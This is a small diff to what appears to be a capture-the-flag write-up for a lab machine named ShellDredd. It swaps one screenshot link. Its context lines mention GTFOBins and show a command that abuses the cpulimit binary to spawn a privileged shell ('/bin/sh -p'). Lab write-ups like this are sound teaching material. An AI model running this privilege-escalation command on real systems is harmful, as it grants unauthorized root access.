@@ -218,7 +218,7 @@ We can now use on of these files to escalate our privilege.
 
 Let's go to [GTFOBins](https://gtfobins.github.io/) to search for an exploit for the `cpulimit` utility.
 
-![1](https://github.com/user-attachments/assets/c3662135-4742-453b-85fd-02037f6a2788)
+![1](https://github.com/user-attachments/assets/10ba9487-da3c-4245-9227-5308cd063fa9)
 
 ```
 hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
